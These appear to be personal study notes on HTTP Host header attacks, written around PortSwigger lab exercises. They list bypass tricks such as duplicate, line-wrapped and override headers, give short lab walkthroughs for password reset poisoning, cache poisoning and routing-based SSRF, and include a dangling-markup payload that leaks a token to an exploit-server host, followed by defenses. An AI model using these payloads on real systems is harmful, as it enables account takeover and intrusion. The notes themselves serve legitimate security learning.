![[Pasted image 20240716181345.png]]
how can the server know what site the user want to access although the server is hosting a lot of sites on the same IP => from the *host header*

## What is the HTTP Host header?
The HTTP Host header is a mandatory request header as of HTTP/1.1. It specifies the domain name that the client wants to access. For example, when a user visits `https://portswigger.net/web-security`, their browser will compose a request containing a Host header as follows:
`GET /web-security HTTP/1.1 Host: portswigger.net`
In some cases, such as when the request has been forwarded by an intermediary system, the Host value may be altered before it reaches the intended back-end component.

---
## How to bypass the host header protections ?
#### 1. Check for flawed validation
- **injecting a payload via the port**
`GET /example HTTP/1.1`
`Host: vulnerable-website.com:bad-stuff-here`
- **arbitrary domain name that ends with the same sequence of characters as a whitelisted one**
`GET /example HTTP/1.1`
`Host: hacked-subdomain.vulnerable-website.com`
#### 2. Send ambiguous requests
- **Inject duplicate Host headers**
	Let's say the front-end gives precedence to the first instance of the header, but the back-end prefers the final instance. Given this scenario, you could use the first header to ensure that your request is routed to the intended target and use the second header to pass your payload into the server-side code.
- **Supply an absolute URL**
	`GET https://vulnerable-website.com/`
	`HTTP/1.1 Host: bad-stuff-here`
- **Add line wrapping**
	The website may block requests with multiple Host headers, but you may be able to bypass this validation by indenting one of them like this. If the front-end ignores the indented header, the request will be processed as an ordinary request for `vulnerable-website.com`. Now let's say the back-end ignores the leading space and gives precedence to the first header in the case of duplicates. This discrepancy might allow you to pass arbitrary values via the "wrapped" Host header.
	`GET /example HTTP/1.1`
	`    Host: bad-stuff-here`
	`Host: vulnerable-website.com`
#### 3. Inject host override headers
- `X-Host`
- `X-Forwarded-Server`
- `X-HTTP-Host-Override`
- `Forwarded`

---
## How to exploit the HTTP Host header
- Password reset poisoning
- Web cache poisoning
- Exploiting classic server-side vulnerabilities
- Bypassing authentication
- Virtual host brute-forcing
- Routing-based SSRF


**When multiple applications are accessible via the same IP address, this is most commonly a result of one of the following scenarios.** {adel|blue}
#### Virtual hosting {adel}
One possible scenario is when a single web server hosts multiple websites or applications. This could be multiple websites with a single owner, but it is also possible for websites with different owners to be hosted on a single, shared platform. This is less common than it used to be, but still occurs with some cloud-based SaaS solutions. Websites hosted on a single server are known as "virtual hosts"

#### Routing traffic via an intermediary {adel}
Another common scenario is when websites are hosted on distinct back-end servers, but all traffic between the client and servers is routed through an intermediary system. This could be a simple load balancer or a reverse proxy server of some kind. This setup is especially prevalent in cases where clients access the website via a content delivery network (CDN)
In this case, even though the websites are hosted on separate back-end servers, all of their domain names resolve to a single IP address of the intermediary component. This presents some of the same challenges as virtual hosting because the reverse proxy or load balancer needs to know the appropriate back-end to which it should route each request

### How does the HTTP Host header solve this problem?
In both of these scenarios, the Host header is relied on to specify the intended recipient. A common analogy is the process of sending a letter to somebody who lives in an apartment building. The entire building has the same street address, but behind this street address there are many different apartments that each need to receive the correct mail somehow. One solution to this problem is simply to include the apartment number or the recipient's name in the address. In the case of HTTP messages, the Host header serves a similar purpose.

When a browser sends the request, the target URL will resolve to the IP address of a particular server. When this server receives the request, it refers to the Host header to determine the intended back-end and forwards the request accordingly.

### host header attack can lead to a lot of attacks such as :
- Web cache poisoning
- Business logic flaws in specific functionality
- Routing-based SSRF
- Classic server-side vulnerabilities, such as SQL injection
### what to try while testing ?
* test
* dev
* stage
* localhost

## Labs
* #Portswigger
	1. **Basic password reset poisoning** #APPRENTICE 
		to solve solve the lab you have to takeover Carlos account
		I found that the host header accepts any input so I put my server in the host header and send a `/forget/passwd` GET request with Carlos 
		name and when Carlos open the link the token sent to me now I can change his password  
	2. **Host header authentication bypass** #APPRENTICE 
		After visiting the admin page we get this message “Admin interface only available to local users”. So we have to send our requests as local users to enter the admin page so we will inject `localhost` on the host header
	3. **Web cache poisoning via ambiguous requests** #PRACTITIONER 
		add two host headers to your request to spoof the host header one with the right host value and the other with your server value and add `alert(document.cookie);` in `/resources/js/tracking.js` file on your sever to and then poison the cache
	4. **Routing-based SSRF** #PRACTITIONER 
		I searched for the IP that hold the admin panel in host header `192.168.0.0/24`  until I got this IP `192.168.0.54` when I request  /admin using this host I got the page and read it until I got the information of how to delete user `post /admin/delete` request and `username=carlos&csrf=jkhpweferiufhf` as a body
	5. **SSRF via flawed request parsing** #PRACTITIONER 
		Observe that you can also access the home page by supplying an absolute URL in the request line like this `GET https://YOUR-LAB-ID.web-security-academy.net/`
		*the rest of the lab like the last lab*
	6. **Host validation bypass via connection state attack** #PRACTITIONER 
		I send two requests in single connection one with real host and path and the other with admin path and 192.168.0.1 host and it worked this attack based on *Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling* 
	7. **Password reset poisoning via dangling markup** #EXPERT 
		`Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`
		This injection tricked the email client into including a malicious link
		The server-side application failed to sanitize the `Host` header properly, allowing injection and The request made by the victim's browser to your exploit server will carry any sensitive data as part of the navigation attempt

# Common defenses against HTTP Host header attacks
1. the simplest approach is to avoid using the Host header altogether in server-side code.
2. Protect absolute URLs
	When you have to use absolute URLs, you should require the current domain to be manually specified in a configuration file and refer to this value instead of the Host header. This approach would eliminate the threat of password reset poisoning.
3. Validate the Host header
	If you must use the Host header, make sure you validate it properly. This should involve checking it against a whitelist of permitted domains and rejecting or redirecting any requests for unrecognized hosts. You should consult the documentation of your framework for guidance on how to do this. For example, the Django framework provides the `ALLOWED_HOSTS` option in the settings file. This approach will reduce your exposure to Host header injection attacks.
4. Don't support Host override headers
	It is also important to check that you do not support additional headers that may be used to construct these attacks, in particular `X-Forwarded-Host`. Remember that these may be supported by default.
5. Be careful with internal-only virtual hosts
	When using virtual hosting, you should avoid hosting internal-only websites and applications on the same server as public-facing content. Otherwise, attackers may be able to access internal domains via Host header manipulation.
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 90
  - item: "Browser"
    user: "Effective against the attack"
    score: 0
  - item: "Server"
    user: "Effective against the attack"
    score: 40
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 0
  - item: "WAF"
    user: "Effective against the attack"
    score: 10

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```
# NOTES
- Sometimes, you will still be able to access the target website even when you supply an unexpected Host header. This could be for a number of reasons => servers are sometimes configured with a default or fallback option in case they receive requests for domain names that they don't recognize